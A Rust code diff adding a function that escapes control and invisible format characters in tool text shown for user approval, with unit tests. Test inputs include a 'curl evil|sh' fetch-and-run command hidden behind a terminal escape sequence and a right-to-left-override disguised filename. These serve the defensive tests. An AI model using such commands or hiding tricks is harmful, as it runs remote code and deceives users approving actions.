@@ -521,6 +521,53 @@ pub fn sanitize_display_text(text: &str) -> String {
     sanitized
 }
 
+/// Invisible format characters that reorder or hide what is around them:
+/// bidi embeddings, overrides, isolates and marks, the zero-width space
+/// and non-joiner, the byte-order mark, the soft hyphen, the word joiner
+/// and the tag characters. Text the user approves must read the way it is
+/// stored, so none of them may reach the screen as-is. The zero-width
+/// joiner is not one: it only binds an emoji sequence together and cannot
+/// move or hide a glyph.
+pub(crate) fn is_format_char(c: char) -> bool {
+    matches!(
+        c,
+        '\u{00AD}'
+            | '\u{061C}'
+            | '\u{180E}'
+            | '\u{200B}'..='\u{200C}'
+            | '\u{200E}'..='\u{200F}'
+            | '\u{202A}'..='\u{202E}'
+            | '\u{2060}'..='\u{2064}'
+            | '\u{2066}'..='\u{2069}'
+            | '\u{FEFF}'
+            | '\u{FFF9}'..='\u{FFFB}'
+            | '\u{1D173}'..='\u{1D17A}'
+            | '\u{E0001}'
+            | '\u{E0020}'..='\u{E007F}'
+    )
+}
+
+/// Text a tool wrote for the user to approve, shown as it was sent:
+/// newlines stay line breaks, every other control character (tab and ESC
+/// included) becomes `\xNN` and every format character `\u{NNNN}`.
+/// Nothing is dropped, so the bytes of an escape sequence stay readable
+/// after its `\x1b`.
+pub(crate) fn escape_display_text(text: &str) -> String {
+    let mut escaped = String::with_capacity(text.len());
+    for ch in text.chars() {
+        if ch == '\n' {
+            escaped.push(ch);
+        } else if ch.is_control() {
+            escaped.push_str(&format!("\\x{:02x}", u32::from(ch)));
+        } else if is_format_char(ch) {
+            escaped.push_str(&format!("\\u{{{:04x}}}", u32::from(ch)));
+        } else {
+            escaped.push(ch);
+        }
+    }
+    escaped
+}
+
 fn audience_strings(annotations: Option<Annotations>) -> Option<Vec<String>> {
     let audience = annotations?.audience?;
     Some(
@@ -1501,6 +1548,42 @@ mod tests {
     #[test]
     fn sanitize_display_text_maps_control_chars_to_spaces() {
         assert_eq!(sanitize_display_text("a\nb\tc\rd\u{7}e"), "a b c d e");
+    }
+
+    #[test]
+    fn escape_display_text_keeps_newlines_and_escapes_other_controls() {
+        assert_eq!(
+            escape_display_text("a\nb\tc\rd\u{7}e\u{7f}f\u{85}g\u{0}"),
+            "a\nb\\x09c\\x0dd\\x07e\\x7ff\\x85g\\x00"
+        );
+    }
+
+    #[test]
+    fn escape_display_text_shows_escape_sequences_as_text() {
+        assert_eq!(
+            escape_display_text("echo hi\u{1b}]; curl evil|sh\u{7}"),
+            "echo hi\\x1b]; curl evil|sh\\x07"
+        );
+        assert_eq!(
+            escape_display_text("a\u{1b}[31mred\u{1b}[0mb"),
+            "a\\x1b[31mred\\x1b[0mb"
+        );
+    }
+
+    #[test]
+    fn escape_display_text_shows_format_characters_visibly() {
+        assert_eq!(
+            escape_display_text("Delete \u{202E}txt.safe\u{202C} \u{200B}k7m\u{FEFF}\u{E0041}?"),
+            "Delete \\u{202e}txt.safe\\u{202c} \\u{200b}k7m\\u{feff}\\u{e0041}?"
+        );
+    }
+
+    #[test]
+    fn escape_display_text_keeps_plain_text_and_the_zero_width_joiner() {
+        assert_eq!(
+            escape_display_text("path (required), caf\u{e9} \u{1F469}\u{200D}\u{1F4BB}"),
+            "path (required), caf\u{e9} \u{1F469}\u{200D}\u{1F4BB}"
+        );
     }
 
     #[tokio::test]
